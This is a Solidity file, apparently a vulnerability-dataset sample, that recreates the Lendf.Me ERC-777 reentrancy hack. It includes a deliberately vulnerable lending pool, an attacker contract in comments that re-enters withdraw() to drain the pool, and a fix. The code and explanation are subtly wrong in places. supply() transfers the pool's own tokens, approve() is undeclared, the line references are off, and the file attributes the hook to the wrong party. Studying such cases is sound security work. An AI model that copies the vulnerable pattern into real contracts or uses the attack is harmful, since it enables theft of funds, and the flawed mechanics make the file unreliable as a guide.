/*LN-1*/ // SPDX-License-Identifier: MIT
/*LN-2*/ pragma solidity ^0.8.0;
/*LN-3*/ 
/*LN-4*/ /**
/*LN-5*/  * @title Lendf.Me - ERC-777 Reentrancy Vulnerability
/*LN-6*/  * @notice This contract demonstrates the vulnerability that led to the Lendf.Me hack
/*LN-7*/  * @dev April 19, 2020 - $25M stolen through ERC-777 token hooks reentrancy
/*LN-8*/  *
/*LN-9*/  * VULNERABILITY: ERC-777 reentrancy via tokensToSend hook
/*LN-10*/  *
/*LN-11*/  * ROOT CAUSE:
/*LN-12*/  * The withdraw() function transfers ERC-777 tokens BEFORE updating user balances.
/*LN-13*/  * ERC-777 tokens trigger a tokensToSend() hook on the sender during transfer,
/*LN-14*/  * allowing the attacker to re-enter withdraw() before their balance is updated.
/*LN-15*/  *
/*LN-16*/  * ATTACK VECTOR:
/*LN-17*/  * 1. Attacker supplies ERC-777 tokens (imBTC) to the lending pool
/*LN-18*/  * 2. Attacker calls withdraw() to withdraw tokens
/*LN-19*/  * 3. During token transfer, ERC-777 calls attacker's tokensToSend() hook
/*LN-20*/  * 4. In the hook, attacker calls withdraw() again
/*LN-21*/  * 5. Since balance hasn't been updated, attacker withdraws again
/*LN-22*/  * 6. Process repeats until pool is drained
/*LN-23*/  *
/*LN-24*/  * Unlike classic reentrancy which uses fallback(), this exploits ERC-777's
/*LN-25*/  * tokensToSend hook mechanism.
/*LN-26*/  */
/*LN-27*/ 
/*LN-28*/ interface IERC777 {
/*LN-29*/     function transfer(address to, uint256 amount) external returns (bool);
/*LN-30*/ 
/*LN-31*/     function balanceOf(address account) external view returns (uint256);
/*LN-32*/ }
/*LN-33*/ 
/*LN-34*/ interface IERC1820Registry {
/*LN-35*/     function setInterfaceImplementer(
/*LN-36*/         address account,
/*LN-37*/         bytes32 interfaceHash,
/*LN-38*/         address implementer
/*LN-39*/     ) external;
/*LN-40*/ }
/*LN-41*/ 
/*LN-42*/ contract VulnerableLendingPool {
/*LN-43*/     mapping(address => mapping(address => uint256)) public supplied;
/*LN-44*/     mapping(address => uint256) public totalSupplied;
/*LN-45*/ 
/*LN-46*/     /**
/*LN-47*/      * @notice Supply tokens to the lending pool
/*LN-48*/      * @param asset The ERC-777 token to supply
/*LN-49*/      * @param amount Amount to supply
/*LN-50*/      */
/*LN-51*/     function supply(address asset, uint256 amount) external returns (uint256) {
/*LN-52*/         IERC777 token = IERC777(asset);
/*LN-53*/ 
/*LN-54*/         // Transfer tokens from user
/*LN-55*/         require(token.transfer(address(this), amount), "Transfer failed");
/*LN-56*/ 
/*LN-57*/         // Update balances
/*LN-58*/         supplied[msg.sender][asset] += amount;
/*LN-59*/         totalSupplied[asset] += amount;
/*LN-60*/ 
/*LN-61*/         return amount;
/*LN-62*/     }
/*LN-63*/ 
/*LN-64*/     /**
/*LN-65*/      * @notice Withdraw supplied tokens
/*LN-66*/      * @param asset The token to withdraw
/*LN-67*/      * @param requestedAmount Amount to withdraw (type(uint256).max for all)
/*LN-68*/      *
/*LN-69*/      * VULNERABILITY IS HERE:
/*LN-70*/      * The function transfers tokens BEFORE updating the user's balance.
/*LN-71*/      * For ERC-777 tokens, the transfer triggers tokensToSend() hook on the sender,
/*LN-72*/      * creating a reentrancy opportunity.
/*LN-73*/      *
/*LN-74*/      * Vulnerable pattern:
/*LN-75*/      * 1. Calculate withdrawal amount (line 86-88)
/*LN-76*/      * 2. Transfer tokens (line 91) <- EXTERNAL CALL WITH HOOK
/*LN-77*/      * 3. Update balances (line 94-95) <- TOO LATE!
/*LN-78*/      */
/*LN-79*/     function withdraw(
/*LN-80*/         address asset,
/*LN-81*/         uint256 requestedAmount
/*LN-82*/     ) external returns (uint256) {
/*LN-83*/         uint256 userBalance = supplied[msg.sender][asset];
/*LN-84*/         require(userBalance > 0, "No balance");
/*LN-85*/ 
/*LN-86*/         // Determine actual withdrawal amount
/*LN-87*/         uint256 withdrawAmount = requestedAmount;
/*LN-88*/         if (requestedAmount == type(uint256).max) {
/*LN-89*/             withdrawAmount = userBalance;
/*LN-90*/         }
/*LN-91*/         require(withdrawAmount <= userBalance, "Insufficient balance");
/*LN-92*/ 
/*LN-93*/         // VULNERABLE: Transfer before state update
/*LN-94*/         // For ERC-777, this triggers tokensToSend() callback
/*LN-95*/         IERC777(asset).transfer(msg.sender, withdrawAmount);
/*LN-96*/ 
/*LN-97*/         // Update state (happens too late!)
/*LN-98*/         supplied[msg.sender][asset] -= withdrawAmount;
/*LN-99*/         totalSupplied[asset] -= withdrawAmount;
/*LN-100*/ 
/*LN-101*/         return withdrawAmount;
/*LN-102*/     }
/*LN-103*/ 
/*LN-104*/     /**
/*LN-105*/      * @notice Get user's supplied balance
/*LN-106*/      */
/*LN-107*/     function getSupplied(
/*LN-108*/         address user,
/*LN-109*/         address asset
/*LN-110*/     ) external view returns (uint256) {
/*LN-111*/         return supplied[user][asset];
/*LN-112*/     }
/*LN-113*/ }
/*LN-114*/ 
/*LN-115*/ /**
/*LN-116*/  * Example ERC-777 attack contract:
/*LN-117*/  *
/*LN-118*/  * contract LendfMeAttacker {
/*LN-119*/  *     VulnerableLendingPool public pool;
/*LN-120*/  *     IERC777 public token;
/*LN-121*/  *     uint256 public iterations = 0;
/*LN-122*/  *
/*LN-123*/  *     // ERC-777 tokensToSend hook - called during transfer
/*LN-124*/  *     function tokensToSend(
/*LN-125*/  *         address,
/*LN-126*/  *         address,
/*LN-127*/  *         address,
/*LN-128*/  *         uint256 amount,
/*LN-129*/  *         bytes calldata,
/*LN-130*/  *         bytes calldata
/*LN-131*/  *     ) external {
/*LN-132*/  *         iterations++;
/*LN-133*/  *         if (iterations < 10 && pool.totalSupplied(address(token)) > 0) {
/*LN-134*/  *             pool.withdraw(address(token), type(uint256).max);  // Reenter!
/*LN-135*/  *         }
/*LN-136*/  *     }
/*LN-137*/  *
/*LN-138*/  *     function attack() external {
/*LN-139*/  *         token.approve(address(pool), type(uint256).max);
/*LN-140*/  *         pool.supply(address(token), 100 ether);
/*LN-141*/  *         pool.withdraw(address(token), type(uint256).max);
/*LN-142*/  *     }
/*LN-143*/  * }
/*LN-144*/  *
/*LN-145*/  * REAL-WORLD IMPACT:
/*LN-146*/  * - $25M stolen in April 2020
/*LN-147*/  * - All funds eventually recovered through whitehat/negotiations
/*LN-148*/  * - Highlighted dangers of ERC-777 token standard
/*LN-149*/  * - Led to reduced adoption of ERC-777 in DeFi
/*LN-150*/  *
/*LN-151*/  * FIX:
/*LN-152*/  * Update state BEFORE transferring tokens:
/*LN-153*/  *
/*LN-154*/  * function withdraw(address asset, uint256 requestedAmount) external returns (uint256) {
/*LN-155*/  *     uint256 userBalance = supplied[msg.sender][asset];
/*LN-156*/  *     require(userBalance > 0, "No balance");
/*LN-157*/  *
/*LN-158*/  *     uint256 withdrawAmount = requestedAmount == type(uint256).max
/*LN-159*/  *         ? userBalance
/*LN-160*/  *         : requestedAmount;
/*LN-161*/  *     require(withdrawAmount <= userBalance, "Insufficient balance");
/*LN-162*/  *
/*LN-163*/  *     // Update state FIRST
/*LN-164*/  *     supplied[msg.sender][asset] -= withdrawAmount;
/*LN-165*/  *     totalSupplied[asset] -= withdrawAmount;
/*LN-166*/  *
/*LN-167*/  *     // Then transfer
/*LN-168*/  *     IERC777(asset).transfer(msg.sender, withdrawAmount);
/*LN-169*/  *
/*LN-170*/  *     return withdrawAmount;
/*LN-171*/  * }
/*LN-172*/  *
/*LN-173*/  * Or use ReentrancyGuard modifier.
/*LN-174*/  *
/*LN-175*/  *
/*LN-176*/  * KEY LESSON:
/*LN-177*/  * ERC-777 tokens can trigger callbacks during transfers.
/*LN-178*/  * Always update state before any token transfer, not just ETH transfers.
/*LN-179*/  * Consider ERC-777 hooks as potential reentrancy vectors.
/*LN-180*/  */
/*LN-181*/ 